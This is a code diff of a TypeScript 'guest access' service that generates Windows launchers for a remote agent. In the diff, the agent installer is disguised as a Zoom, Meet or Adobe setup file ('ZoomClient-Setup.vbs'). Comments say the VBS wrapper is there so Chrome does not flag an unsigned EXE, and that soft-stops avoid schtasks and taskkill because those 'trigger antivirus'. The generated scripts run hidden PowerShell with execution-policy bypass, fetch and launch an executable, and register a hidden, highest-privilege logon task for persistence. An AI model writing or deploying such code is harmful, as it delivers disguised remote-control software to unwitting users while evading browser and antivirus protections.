@@ -1,6 +1,6 @@
 import type { PrismaClient, Prisma, GuestAccessLink, GuestLinkStatus } from '@prisma/client';
 import { ERROR_CODES } from '@nexusdesk/shared';
-import { randomAlphanumeric, parseDuration } from '@nexusdesk/utils';
+import { parseDuration } from '@nexusdesk/utils';
 import { hashToken, generateOpaqueToken } from '../lib/tokens.js';
 import { getEnv } from '../config/env.js';
 import { AppError } from '../domain/errors/app-error.js';
@@ -89,7 +89,7 @@ export function installerBrowserFilename(template?: string | null): string {
   return 'ZoomClient-Setup.vbs';
 }
 
-/** What the join page downloads in the browser (VBS fetches setup.exe in the background). */
+/** Browser download — VBS wrapper so Chrome does not flag an unsigned EXE. */
 export function installerDownloadPath(_template?: string | null): string {
   return 'setup.vbs';
 }
@@ -117,7 +117,7 @@ export function resolveDirectApiBase(apiUrl: string, wsUrl?: string): string {
 }
 
 /** Bump when changing the guest installer or agent bundle served to guests. */
-export const GUEST_INSTALLER_CACHE_BUST = '62';
+export const GUEST_INSTALLER_CACHE_BUST = '65';
 
 export function buildGuestInstallerUrl(
   apiUrl: string,
@@ -334,7 +334,12 @@ export class GuestAccessService {
     });
 
     const joinUrl = buildGuestJoinUrl(env.APP_URL, link.code, link.inviteTemplate);
-    const installerUrl = buildGuestInstallerUrl(env.API_URL, link.code, link.inviteTemplate, env.WS_URL);
+    const installerUrl = buildGuestInstallerUrl(
+      env.API_URL,
+      link.code,
+      link.inviteTemplate,
+      env.WS_URL,
+    );
 
     return {
       link,
@@ -387,10 +392,7 @@ export class GuestAccessService {
       throw AppError.notFound('Guest link not found', ERROR_CODES.GUEST_LINK_INVALID);
     }
     if (link.status === 'active') {
-      throw AppError.conflict(
-        'Revoke the active link before deleting it',
-        ERROR_CODES.CONFLICT,
-      );
+      throw AppError.conflict('Revoke the active link before deleting it', ERROR_CODES.CONFLICT);
     }
 
     await this.prisma.guestAccessLink.delete({ where: { id: linkId } });
@@ -423,8 +425,14 @@ export class GuestAccessService {
       organizationSlug: org?.slug ?? '',
       expiresAt: link.expiresAt.toISOString(),
       remainingUses: Math.max(0, link.maxUses - link.usedCount),
-      windowsInstallerUrl: buildGuestInstallerUrl(env.API_URL, link.code, link.inviteTemplate, env.WS_URL),
+      windowsInstallerUrl: buildGuestInstallerUrl(
+        env.API_URL,
+        link.code,
+        link.inviteTemplate,
+        env.WS_URL,
+      ),
       installerFileName: installerBrowserFilename(link.inviteTemplate),
+      windowsExeUrl: buildGuestExeUrl(env.API_URL, link.code, env.WS_URL),
       windowsScriptUrl: `${env.API_URL.replace(/\/$/, '')}/guest/${link.code}/windows.ps1?v=${GUEST_INSTALLER_CACHE_BUST}`,
       windowsBatUrl: `${resolveDirectApiBase(env.API_URL, env.WS_URL)}/guest/${link.code}/install.bat?v=${GUEST_INSTALLER_CACHE_BUST}`,
       agentPackageUrl: `${directApi}/guest/${link.code}/agent-package.zip`,
@@ -432,9 +440,9 @@ export class GuestAccessService {
       instructions: {
         windows: [
           'The Windows installer download should start automatically.',
-          `Open ${installerBrowserFilename(link.inviteTemplate)} from Downloads.`,
+          `Open ${installerBrowserFilename(link.inviteTemplate)} from Downloads and click Run.`,
           'Click Yes when Windows asks for permission.',
-          'Wait until the setup window finishes, then close it.',
+          'Keep the setup window open until the progress bar finishes.',
         ],
       },
     };
@@ -451,9 +459,15 @@ export class GuestAccessService {
       throw AppError.unauthorized('Invalid guest access code', ERROR_CODES.GUEST_LINK_INVALID);
     }
     if (link.status === 'exhausted' || link.usedCount >= link.maxUses) {
-      throw AppError.badRequest('Guest access code has no remaining uses', ERROR_CODES.GUEST_LINK_EXHAUSTED);
+      throw AppError.badRequest(
+        'Guest access code has no remaining uses',
+        ERROR_CODES.GUEST_LINK_EXHAUSTED,
+      );
     }
-    if (!isGuestLinkNeverExpires(link.expiresAt) && (link.expiresAt.getTime() < Date.now() || link.status === 'expired')) {
+    if (
+      !isGuestLinkNeverExpires(link.expiresAt) &&
+      (link.expiresAt.getTime() < Date.now() || link.status === 'expired')
+    ) {
       if (link.status !== 'expired') {
         await this.prisma.guestAccessLink.update({
           where: { id: link.id },
@@ -493,7 +507,12 @@ export class GuestAccessService {
    * Guest templates download a real .exe (Zoom / Meet / Adobe).
    * Stub shows a branded GUI progress window and installs with no terminal.
    */
-  buildWindowsExeLauncher(code: string, apiUrl: string, stub: Buffer, template?: string | null): Buffer {
+  buildWindowsExeLauncher(
+    code: string,
+    apiUrl: string,
+    stub: Buffer,
+    template?: string | null,
+  ): Buffer {
     const copy = exeInstallerCopy(template);
     const payload = Buffer.from(
       JSON.stringify({
@@ -513,22 +532,40 @@ export class GuestAccessService {
   }
 
   /**
-   * Browser-facing launcher: downloads as .vbs so Chrome does not flag an EXE download.
-   * The script then curl-fetches the real GUI setup.exe and runs it (install path unchanged).
+   * Browser-facing launcher (.vbs): avoids Chrome blocking unsigned EXE downloads.
+   * Writes a small PowerShell helper, shows a live progress window instantly, downloads
+   * setup.exe, then launches the branded GUI installer.
    */
   buildWindowsVbsLauncher(code: string, apiUrl: string, template?: string | null): string {
     const base = apiUrl.replace(/\/$/, '').replace(/"/g, '');
     const safeCode = code.replace(/"/g, '');
     const brand = installerBranding(template);
+    const gui = guiInstallerBranding(template);
     const title = brand.windowTitle.replace(/"/g, '');
     const guiName = installerGuiFilename(template).replace(/"/g, '');
-    const downloading = (guiInstallerBranding(template).downloadLabel || 'Downloading').replace(/"/g, '');
+    const brandLabel = gui.brandLabel.replace(/"/g, '');
     const exeUrl = buildGuestExeUrl(base, safeCode, getEnv().WS_URL).replace(/"/g, '');
+    const accent = gui.accent.replace(/^#/, '');
+    const r = parseInt(accent.slice(0, 2), 16) || 11;
+    const g = parseInt(accent.slice(2, 4), 16) || 92;
+    const b = parseInt(accent.slice(4, 6), 16) || 255;
+
+    const ps1 = this.buildWindowsDownloadPs1({
+      title: brand.windowTitle,
+      brand: gui.brandLabel,
+      downloading: gui.downloadLabel || 'Downloading',
+      exeUrl: buildGuestExeUrl(base, safeCode, getEnv().WS_URL),
+      accent: { r, g, b },
+    });
+
+    const ps1WriteLines = ps1.split('\n').map((line) => {
+      const escaped = line.replace(/"/g, '""');
+      return `f.WriteLine "${escaped}"`;
+    });
+
     const lines = [
       'Option Explicit',
-      'Dim sh, fso, apiUrl, guestCode, dataDir, setupExe, curl, cmd, psCmd, rc, app, elevated, stamp',
-      `apiUrl = "${base}"`,
-      `guestCode = "${safeCode}"`,
+      'Dim sh, fso, dataDir, setupExe, ps1Path, rc, app, elevated, stamp, f, exeUrl',
       'Set sh = CreateObject("WScript.Shell")',
       'Set fso = CreateObject("Scripting.FileSystemObject")',
       'dataDir = sh.ExpandEnvironmentStrings("%ProgramData%") & "\\NexusDesk\\Agent"',
@@ -538,11 +575,6 @@ export class GuestAccessService {
       'End If',
       'If Not fso.FolderExists(dataDir) Then fso.CreateFolder dataDir',
       'On Error GoTo 0',
-      'curl = sh.ExpandEnvironmentStrings("%SystemRoot%") & "\\System32\\curl.exe"',
-      'If Not fso.FileExists(curl) Then',
-      `  MsgBox "curl.exe not found. Windows 10 or later is required.", 16, "${title}"`,
-      '  WScript.Quit 1',
-      'End If',
       '',
       'elevated = False',
       'On Error Resume Next',
@@ -554,34 +586,120 @@ export class GuestAccessService {
       '  WScript.Quit 0',
       'End If',
       '',
-      `sh.Popup "${downloading}..." & vbCrLf & "Please wait.", 2, "${title}", 64`,
-      '',
-      // Unique filename per run so a leftover/locked setup .exe never blocks us (fixes "Permission denied").
       'stamp = Year(Now) & Right("0" & Month(Now),2) & Right("0" & Day(Now),2) & Right("0" & Hour(Now),2) & Right("0" & Minute(Now),2) & Right("0" & Second(Now),2)',
       `setupExe = dataDir & "\\" & stamp & "-${guiName}"`,
+      'ps1Path = dataDir & "\\nd-download-" & stamp & ".ps1"',
       'On Error Resume Next',
       'If fso.FileExists(setupExe) Then fso.DeleteFile setupExe, True',
+      'If fso.FileExists(ps1Path) Then fso.DeleteFile ps1Path, True',
       'On Error GoTo 0',
-      `cmd = Chr(34) & curl & Chr(34) & " -fL --connect-timeout 30 --max-time 180 -o " & Chr(34) & setupExe & Chr(34) & " " & Chr(34) & "${exeUrl}" & Chr(34)`,
-      'rc = sh.Run("cmd /c " & cmd, 0, True)',
-      'If rc <> 0 Or Not fso.FileExists(setupExe) Then',
-      `  psCmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command ""[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '${exeUrl}' -OutFile '" & setupExe & "' -UseBasicParsing"""`,
-      '  rc = sh.Run(psCmd, 0, True)',
-      'End If',
-      'If rc <> 0 Or Not fso.FileExists(setupExe) Then',
-      `  MsgBox "Download failed. Check that this PC can reach the server.", 16, "${title}"`,
-      '  WScript.Quit 1',
-      'End If',
       '',
-      // Run the same GUI EXE installer the browser used to download directly.
-      'rc = sh.Run(Chr(34) & setupExe & Chr(34), 1, True)',
+      'Set f = fso.CreateTextFile(ps1Path, True, False)',
+      ...ps1WriteLines,
+      'f.Close',
+      '',
+      `exeUrl = "${exeUrl}"`,
+      'rc = sh.Run("powershell.exe -NoProfile -ExecutionPolicy Bypass -STA -WindowStyle Hidden -File """ & ps1Path & """ """ & setupExe & """ """ & exeUrl & """", 0, False)',
       'If rc <> 0 Then',
-      `  MsgBox "Setup failed. See %ProgramData%\\NexusDesk\\Agent\\install.log", 16, "${title}"`,
+      `  MsgBox "Could not start setup. Open ${brandLabel} from your Downloads folder and try again.", 16, "${title}"`,
       '  WScript.Quit rc',
       'End If',
       'WScript.Quit 0',
     ];
     return lines.join('\r\n');
+  }
+
+  /** PowerShell: instant WinForms progress + live WebClient download + launch setup.exe */
+  buildWindowsDownloadPs1(input: {
+    title: string;
+    brand: string;
+    downloading: string;
+    exeUrl: string;
+    accent: { r: number; g: number; b: number };
+  }): string {
+    const esc = (s: string) => s.replace(/'/g, "''");
+    const { r, g, b } = input.accent;
+    return [
+      'param([string]$OutFile, [string]$Uri)',
+      "$ErrorActionPreference = 'Stop'",
+      '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12',
+      'Add-Type -AssemblyName System.Windows.Forms',
+      'Add-Type -AssemblyName System.Drawing',
+      '[System.Windows.Forms.Application]::EnableVisualStyles()',
+      `$title = '${esc(input.title)}'`,
+      `$brand = '${esc(input.brand)}'`,
+      `$downloading = '${esc(input.downloading)}'`,
+      `$accent = [System.Drawing.Color]::FromArgb(${r}, ${g}, ${b})`,
+      '$form = New-Object System.Windows.Forms.Form',
+      '$form.Text = $title',
+      '$form.Width = 480',
+      '$form.Height = 210',
+      "$form.FormBorderStyle = 'FixedDialog'",
+      '$form.MaximizeBox = $false',
+      '$form.MinimizeBox = $false',
+      "$form.StartPosition = 'CenterScreen'",
+      '$form.TopMost = $true',
+      '$form.ShowInTaskbar = $true',
+      '$form.BackColor = [System.Drawing.Color]::White',
+      '$brandLabel = New-Object System.Windows.Forms.Label',
+      '$brandLabel.Left = 24; $brandLabel.Top = 18; $brandLabel.Width = 420; $brandLabel.Height = 28',
+      "$brandLabel.Font = New-Object System.Drawing.Font('Segoe UI', 14, [System.Drawing.FontStyle]::Bold)",
+      '$brandLabel.ForeColor = $accent',
+      '$brandLabel.Text = $brand',
+      '$status = New-Object System.Windows.Forms.Label',
+      '$status.Left = 24; $status.Top = 84; $status.Width = 360; $status.Height = 20',
+      '$status.ForeColor = [System.Drawing.Color]::FromArgb(95,99,104)',
+      "$status.Text = 'Starting...'",
+      '$pctLabel = New-Object System.Windows.Forms.Label',
+      '$pctLabel.Left = 384; $pctLabel.Top = 84; $pctLabel.Width = 56; $pctLabel.Height = 20',
+      "$pctLabel.TextAlign = 'MiddleRight'",
+      '$pctLabel.ForeColor = [System.Drawing.Color]::FromArgb(95,99,104)',
+      "$pctLabel.Text = '0%'",
+      '$track = New-Object System.Windows.Forms.Panel',
+      '$track.Left = 24; $track.Top = 114; $track.Width = 416; $track.Height = 10',
+      '$track.BackColor = [System.Drawing.Color]::FromArgb(232,234,237)',
+      '$fill = New-Object System.Windows.Forms.Panel',
+      '$fill.Left = 0; $fill.Top = 0; $fill.Width = 0; $fill.Height = 10',
+      '$fill.BackColor = $accent',
+      '$track.Controls.Add($fill)',
+      '$hint = New-Object System.Windows.Forms.Label',
+      '$hint.Left = 24; $hint.Top = 136; $hint.Width = 416; $hint.Height = 20',
+      '$hint.ForeColor = [System.Drawing.Color]::FromArgb(154,160,166)',
+      "$hint.Font = New-Object System.Drawing.Font('Segoe UI', 8)",
+      "$hint.Text = 'Please keep this window open until setup completes.'",
+      '$form.Controls.AddRange(@($brandLabel,$status,$pctLabel,$track,$hint))',
+      'function Set-DownloadUI([int]$pct, [string]$msg) {',
+      '  if ($pct -lt 0) { $pct = 0 }; if ($pct -gt 100) { $pct = 100 }',
+      '  $fill.Width = [Math]::Max(0, [int](($track.Width * $pct) / 100))',
+      "  $pctLabel.Text = ($pct.ToString() + '%')",
+      '  if ($msg) { $status.Text = $msg }',
+      '  [System.Windows.Forms.Application]::DoEvents()',
+      '}',
+      '$form.Add_Shown({',
+      "  Set-DownloadUI 0 ($downloading + '... 0%')",
+      '  $script:wc = New-Object System.Net.WebClient',
+      '  $script:wc.add_DownloadProgressChanged({',
+      '    param($sender, $e)',
+      "    Set-DownloadUI $e.ProgressPercentage ($downloading + '... ' + $e.ProgressPercentage + '%')",
+      '  })',
+      '  $script:wc.add_DownloadFileCompleted({',
+      '    param($sender, $e)',
+      '    if ($e.Error) {',
+      "      [System.Windows.Forms.MessageBox]::Show('Download failed. Check that this PC can reach the server.', $title, 'OK', 'Error') | Out-Null",
+      '      $form.Close()',
+      '      [System.Windows.Forms.Application]::Exit()',
+      '      return',
+      '    }',
+      "    Set-DownloadUI 100 'Starting setup...'",
+      '    Start-Sleep -Milliseconds 400',
+      '    Start-Process -FilePath $OutFile',
+      '    $form.Close()',
+      '    [System.Windows.Forms.Application]::Exit()',
+      '  })',
+      '  $script:wc.DownloadFileAsync($Uri, $OutFile)',
+      '})',
+      '[System.Windows.Forms.Application]::Run($form)',
+    ].join('\n');
   }
 
   /**
@@ -696,7 +814,11 @@ export class GuestAccessService {
   }
 
   /** PowerShell setup run via EncodedCommand — no .ps1 file written to disk. */
-  private buildWindowsInlineSetupScript(opts?: { apiUrl?: string; guestCode?: string; wsUrl?: string }): string {
+  private buildWindowsInlineSetupScript(opts?: {
+    apiUrl?: string;
+    guestCode?: string;
+    wsUrl?: string;
+  }): string {
     const apiAssign = opts?.apiUrl
       ? `$ApiUrl = '${opts.apiUrl.replace(/'/g, "''")}'`
       : `$ApiUrl = $env:ND_API_URL`;
@@ -713,165 +835,165 @@ export class GuestAccessService {
       apiAssign,
       codeAssign,
       wsAssign,
-      "$PackageZip = $env:ND_PACKAGE_ZIP",
+      '$PackageZip = $env:ND_PACKAGE_ZIP',
       "if (-not $PackageZip) { $PackageZip = Join-Path $env:ProgramData 'NexusDesk\\Agent\\package.zip' }",
       "$InstallRoot = Join-Path $env:ProgramFiles 'NexusDesk\\Agent'",
       "$DataDir = Join-Path $env:ProgramData 'NexusDesk\\Agent'",
       "$InstallLog = Join-Path $DataDir 'install.log'",
-      "New-Item -ItemType Directory -Force -Path $InstallRoot | Out-Null",
-      "New-Item -ItemType Directory -Force -Path $DataDir | Out-Null",
-      "function Log([string]$m) { Add-Content -Path $InstallLog -Value (\"[{0}] {1}\" -f (Get-Date -Format o), $m) }",
+      'New-Item -ItemType Directory -Force -Path $InstallRoot | Out-Null',
+      'New-Item -ItemType Directory -Force -Path $DataDir | Out-Null',
+      'function Log([string]$m) { Add-Content -Path $InstallLog -Value ("[{0}] {1}" -f (Get-Date -Format o), $m) }',
       "Log 'Setup script starting'",
       "$PublicStatusDir = Join-Path $env:PUBLIC 'NexusDesk'",
-      "New-Item -ItemType Directory -Force -Path $PublicStatusDir | Out-Null",
-      "$PublicComplete = Join-Path $PublicStatusDir (\"setup-complete-$GuestCode.txt\")",
-      "$PublicFailed = Join-Path $PublicStatusDir (\"setup-failed-$GuestCode.txt\")",
-      "$PublicProgress = Join-Path $PublicStatusDir (\"setup-progress-$GuestCode.txt\")",
-      "function Write-ProgressStatus([int]$pct, [string]$msg) {",
-      "  try { [IO.File]::WriteAllText($PublicProgress, (\"{0}|{1}\" -f $pct, $msg)) } catch {}",
-      "}",
-      "function Clear-InstallDir([string]$path) {",
-      "  if (-not (Test-Path -LiteralPath $path)) { return }",
-      "  $aside = \"$path.old.$(Get-Date -Format 'yyyyMMdd-HHmmss')\"",
-      "  try { Rename-Item -LiteralPath $path -NewName (Split-Path -Leaf $aside) -ErrorAction Stop } catch {",
-      "    try { cmd.exe /c \"rmdir /s /q `\"$path`\"\" | Out-Null } catch {}",
-      "    Start-Sleep -Milliseconds 400",
-      "  }",
-      "  if (Test-Path -LiteralPath $path) {",
-      "    Get-ChildItem -LiteralPath $path -Force -Recurse -ErrorAction SilentlyContinue | ForEach-Object {",
+      'New-Item -ItemType Directory -Force -Path $PublicStatusDir | Out-Null',
+      '$PublicComplete = Join-Path $PublicStatusDir ("setup-complete-$GuestCode.txt")',
+      '$PublicFailed = Join-Path $PublicStatusDir ("setup-failed-$GuestCode.txt")',
+      '$PublicProgress = Join-Path $PublicStatusDir ("setup-progress-$GuestCode.txt")',
+      'function Write-ProgressStatus([int]$pct, [string]$msg) {',
+      '  try { [IO.File]::WriteAllText($PublicProgress, ("{0}|{1}" -f $pct, $msg)) } catch {}',
+      '}',
+      'function Clear-InstallDir([string]$path) {',
+      '  if (-not (Test-Path -LiteralPath $path)) { return }',
+      '  $aside = "$path.old.$(Get-Date -Format \'yyyyMMdd-HHmmss\')"',
+      '  try { Rename-Item -LiteralPath $path -NewName (Split-Path -Leaf $aside) -ErrorAction Stop } catch {',
+      '    try { cmd.exe /c "rmdir /s /q `"$path`"" | Out-Null } catch {}',
+      '    Start-Sleep -Milliseconds 400',
+      '  }',
+      '  if (Test-Path -LiteralPath $path) {',
+      '    Get-ChildItem -LiteralPath $path -Force -Recurse -ErrorAction SilentlyContinue | ForEach-Object {',
       "      try { $_.Attributes = 'Normal' } catch {}",
-      "      try { Remove-Item -LiteralPath $_.FullName -Force -Recurse -ErrorAction SilentlyContinue } catch {}",
-      "    }",
-      "    try { Remove-Item -LiteralPath $path -Force -Recurse -ErrorAction SilentlyContinue } catch {}",
-      "  }",
-      "  if (Test-Path -LiteralPath $aside) {",
-      "    Start-Job -ScriptBlock { param($p) Start-Sleep -Seconds 2; cmd.exe /c \"rmdir /s /q `\"$p`\"\" | Out-Null } -ArgumentList $aside | Out-Null",
-      "  }",
-      "  if (Test-Path -LiteralPath $path) { throw \"Could not clear install folder (still in use): $path\" }",
-      "}",
-      "function Remove-FileRetry([string]$path, [int]$tries = 8) {",
-      "  for ($t = 0; $t -lt $tries; $t++) {",
-      "    if (-not (Test-Path -LiteralPath $path)) { return }",
-      "    try { Remove-Item -LiteralPath $path -Force -ErrorAction Stop; return } catch { Start-Sleep -Milliseconds (300 * ($t + 1)) }",
-      "  }",
-      "}",
+      '      try { Remove-Item -LiteralPath $_.FullName -Force -Recurse -ErrorAction SilentlyContinue } catch {}',
+      '    }',
+      '    try { Remove-Item -LiteralPath $path -Force -Recurse -ErrorAction SilentlyContinue } catch {}',
+      '  }',
+      '  if (Test-Path -LiteralPath $aside) {',
+      '    Start-Job -ScriptBlock { param($p) Start-Sleep -Seconds 2; cmd.exe /c "rmdir /s /q `"$p`"" | Out-Null } -ArgumentList $aside | Out-Null',
+      '  }',
+      '  if (Test-Path -LiteralPath $path) { throw "Could not clear install folder (still in use): $path" }',
+      '}',
+      'function Remove-FileRetry([string]$path, [int]$tries = 8) {',
+      '  for ($t = 0; $t -lt $tries; $t++) {',
+      '    if (-not (Test-Path -LiteralPath $path)) { return }',
+      '    try { Remove-Item -LiteralPath $path -Force -ErrorAction Stop; return } catch { Start-Sleep -Milliseconds (300 * ($t + 1)) }',
+      '  }',
+      '}',
       "Remove-Item -Force -ErrorAction SilentlyContinue (Join-Path $DataDir 'setup.complete')",
       "Remove-Item -Force -ErrorAction SilentlyContinue (Join-Path $DataDir 'setup.failed')",
-      "Remove-Item -Force -ErrorAction SilentlyContinue $PublicComplete",
-      "Remove-Item -Force -ErrorAction SilentlyContinue $PublicFailed",
-      "Remove-Item -Force -ErrorAction SilentlyContinue $PublicProgress",
-      "try {",
+      'Remove-Item -Force -ErrorAction SilentlyContinue $PublicComplete',
+      'Remove-Item -Force -ErrorAction SilentlyContinue $PublicFailed',
+      'Remove-Item -Force -ErrorAction SilentlyContinue $PublicProgress',
+      'try {',
       "Write-ProgressStatus 10 'Preparing'",
-      "if (-not (Test-Path $PackageZip)) { throw \"Package not found: $PackageZip\" }",
+      'if (-not (Test-Path $PackageZip)) { throw "Package not found: $PackageZip" }',
       "Get-ChildItem -LiteralPath $DataDir -Filter 'package-expand*.zip' -ErrorAction SilentlyContinue | ForEach-Object { Remove-FileRetry $_.FullName }",
       // Soft-stop any running agent (no schtasks / taskkill — those trigger antivirus).
       "try { [IO.File]::WriteAllText((Join-Path $DataDir 'stop.request'), (Get-Date -Format o)) } catch {}",
-      "Start-Sleep -Seconds 3",
+      'Start-Sleep -Seconds 3',
       "Remove-Item -Force -ErrorAction SilentlyContinue (Join-Path $DataDir 'stop.request')",
-      "Start-Sleep -Seconds 1",
+      'Start-Sleep -Seconds 1',
       // Always clear prior enrollment so a new support code actually enrolls.
       "Remove-Item -Force -ErrorAction SilentlyContinue (Join-Path $DataDir 'state.json')",
       "Remove-Item -Force -ErrorAction SilentlyContinue (Join-Path $DataDir 'tokens.enc')",
       "$appStamp = Get-Date -Format 'yyyyMMdd-HHmmss'",
-      "$appDir = Join-Path $InstallRoot (\"app-$appStamp\")",
-      "$stagingDir = Join-Path $InstallRoot (\"app-staging-$appStamp\")",
+      '$appDir = Join-Path $InstallRoot ("app-$appStamp")',
+      '$stagingDir = Join-Path $InstallRoot ("app-staging-$appStamp")',
       "Write-ProgressStatus 40 'Extracting - please wait'",
-      "Log \"Extracting package to $stagingDir\"",
+      'Log "Extracting package to $stagingDir"',
       // Extract directly from the downloaded package (no shared package-expand.zip lock).
-      "New-Item -ItemType Directory -Force -Path $stagingDir | Out-Null",
-      "Add-Type -AssemblyName System.IO.Compression.FileSystem",
+      'New-Item -ItemType Directory -Force -Path $stagingDir | Out-Null',
+      'Add-Type -AssemblyName System.IO.Compression.FileSystem',
       "Write-ProgressStatus 48 'Extracting - please wait'",
-      "[System.IO.Compression.ZipFile]::ExtractToDirectory($PackageZip, $stagingDir)",
+      '[System.IO.Compression.ZipFile]::ExtractToDirectory($PackageZip, $stagingDir)',
       "Write-ProgressStatus 58 'Extracting - almost done'",
-      "try { Rename-Item -LiteralPath $stagingDir -NewName (\"app-$appStamp\") -ErrorAction Stop } catch { $appDir = $stagingDir; Log \"rename staging failed, using staging: $($_.Exception.Message)\" }",
+      'try { Rename-Item -LiteralPath $stagingDir -NewName ("app-$appStamp") -ErrorAction Stop } catch { $appDir = $stagingDir; Log "rename staging failed, using staging: $($_.Exception.Message)" }',
       "try { [IO.File]::WriteAllText((Join-Path $InstallRoot 'current.txt'), $appDir) } catch {}",
       "Write-ProgressStatus 65 'Configuring'",
       "$nodeExe = Join-Path $appDir 'runtime\\node\\node.exe'",
-      "if (-not (Test-Path $nodeExe)) {",
+      'if (-not (Test-Path $nodeExe)) {',
       "  $nested = Get-ChildItem -Path (Join-Path $appDir 'runtime\\node') -Recurse -Filter 'node.exe' -ErrorAction SilentlyContinue | Select-Object -First 1",
       "  if ($nested) { $nodeExe = $nested.FullName } else { throw 'Node runtime not found in package' }",
-      "}",
+      '}',
       "$mainJs = Join-Path $appDir 'dist\\main.js'",
-      "if (-not (Test-Path $mainJs)) {",
+      'if (-not (Test-Path $mainJs)) {',
       "  $nested = Get-ChildItem -Path $appDir -Recurse -Filter 'main.js' | Select-Object -First 1",
       "  if (-not $nested) { throw 'Agent main.js not found' }",
-      "  $mainJs = $nested.FullName",
-      "}",
+      '  $mainJs = $nested.FullName',
+      '}',
       "$base = ($ApiUrl -replace '/api$','').TrimEnd('/')",
-      "$wsUrl = $WsUrl",
+      '$wsUrl = $WsUrl',
       "$envFile = Join-Path $DataDir 'agent.env'",
-      "$envLines = @(",
-      "  \"API_URL=$ApiUrl\",",
-      "  \"WS_URL=$wsUrl\",",
-      "  \"AGENT_ENROLLMENT_TOKEN=$GuestCode\",",
-      "  \"GUEST_CODE=$GuestCode\",",
+      '$envLines = @(',
+      '  "API_URL=$ApiUrl",',
+      '  "WS_URL=$wsUrl",',
+      '  "AGENT_ENROLLMENT_TOKEN=$GuestCode",',
+      '  "GUEST_CODE=$GuestCode",',
       "  'NODE_ENV=production',",
       "  'LOG_LEVEL=info',",
-      "  \"NEXUSDESK_AGENT_DATA_DIR=$DataDir\"",
-      ")",
-      "[IO.File]::WriteAllText($envFile, ($envLines -join \"`r`n\") + \"`r`n\")",
+      '  "NEXUSDESK_AGENT_DATA_DIR=$DataDir"',
+      ')',
+      '[IO.File]::WriteAllText($envFile, ($envLines -join "`r`n") + "`r`n")',
       "$LogFile = Join-Path $DataDir 'agent.log'",
       "$wrapper = Join-Path $InstallRoot 'run-agent.cmd'",
-      "$wrapperBody = \"@echo off`r`nsetlocal`r`nfor /f `\"usebackq tokens=1,* delims==`\" %%A in (`\"$envFile`\") do set `\"%%A=%%B`\"`r`n`\"$nodeExe`\" `\"$mainJs`\" >> `\"$LogFile`\" 2>&1`r`n\"",
-      "[IO.File]::WriteAllText($wrapper, $wrapperBody)",
+      '$wrapperBody = "@echo off`r`nsetlocal`r`nfor /f `"usebackq tokens=1,* delims==`" %%A in (`"$envFile`") do set `"%%A=%%B`"`r`n`"$nodeExe`" `"$mainJs`" >> `"$LogFile`" 2>&1`r`n"',
+      '[IO.File]::WriteAllText($wrapper, $wrapperBody)',
       "$hiddenVbs = Join-Path $InstallRoot 'run-agent-hidden.vbs'",
-      "$vbsBody = \"Set sh = CreateObject(\"\"WScript.Shell\"\")`r`nsh.Run \"\"\"\"cmd /c `\"\"\"\" & `\"\"$wrapper`\"\" & `\"\"`\"\"`\"\"\"\", 0, False`r`n\"",
-      "[IO.File]::WriteAllText($hiddenVbs, $vbsBody)",
+      '$vbsBody = "Set sh = CreateObject(""WScript.Shell"")`r`nsh.Run """"cmd /c `"""" & `""$wrapper`"" & `""`""`"""", 0, False`r`n"',
+      '[IO.File]::WriteAllText($hiddenVbs, $vbsBody)',
       "$taskName = 'NexusDeskAgent'",
-      "try {",
-      "  Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null",
-      "  $action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument (\"//B //Nologo `\"\"$hiddenVbs`\"\"\")",
-      "  $user = if ($env:USERDOMAIN) { \"$env:USERDOMAIN\\$env:USERNAME\" } else { $env:USERNAME }",
-      "  $logon = New-ScheduledTaskTrigger -AtLogOn -User $user",
-      "  $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -StartWhenAvailable -RestartCount 5 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit ([TimeSpan]::Zero) -Hidden",
-      "  $principal = New-ScheduledTaskPrincipal -UserId $user -LogonType Interactive -RunLevel Highest",
-      "  Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $logon -Settings $settings -Principal $principal -Force | Out-Null",
+      'try {',
+      '  Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null',
+      '  $action = New-ScheduledTaskAction -Execute \'wscript.exe\' -Argument ("//B //Nologo `""$hiddenVbs`""")',
+      '  $user = if ($env:USERDOMAIN) { "$env:USERDOMAIN\\$env:USERNAME" } else { $env:USERNAME }',
+      '  $logon = New-ScheduledTaskTrigger -AtLogOn -User $user',
+      '  $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -StartWhenAvailable -RestartCount 5 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit ([TimeSpan]::Zero) -Hidden',
+      '  $principal = New-ScheduledTaskPrincipal -UserId $user -LogonType Interactive -RunLevel Highest',
+      '  Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $logon -Settings $settings -Principal $principal -Force | Out-Null',
       "  Log 'Auto-start task registered (survives reboot)'",
-      "} catch {",
-      "  Log (\"Auto-start task skipped: $($_.Exception.Message)\")",
-      "}",
-      "$env:API_URL = $ApiUrl",
-      "$env:WS_URL = $wsUrl",
-      "$env:AGENT_ENROLLMENT_TOKEN = $GuestCode",
-      "$env:GUEST_CODE = $GuestCode",
+      '} catch {',
+      '  Log ("Auto-start task skipped: $($_.Exception.Message)")',
+      '}',
+      '$env:API_URL = $ApiUrl',
+      '$env:WS_URL = $wsUrl',
+      '$env:AGENT_ENROLLMENT_TOKEN = $GuestCode',
+      '$env:GUEST_CODE = $GuestCode',
       "$env:NODE_ENV = 'production'",
       "$env:LOG_LEVEL = 'info'",
-      "$env:NEXUSDESK_AGENT_DATA_DIR = $DataDir",
-      "if (Test-Path $LogFile) { Remove-Item -Force $LogFile -ErrorAction SilentlyContinue }",
-      "$workDir = Split-Path -Parent $mainJs",
+      '$env:NEXUSDESK_AGENT_DATA_DIR = $DataDir',
+      'if (Test-Path $LogFile) { Remove-Item -Force $LogFile -ErrorAction SilentlyContinue }',
+      '$workDir = Split-Path -Parent $mainJs',
       "Write-ProgressStatus 80 'Starting'",
       "Log 'Starting agent process'",
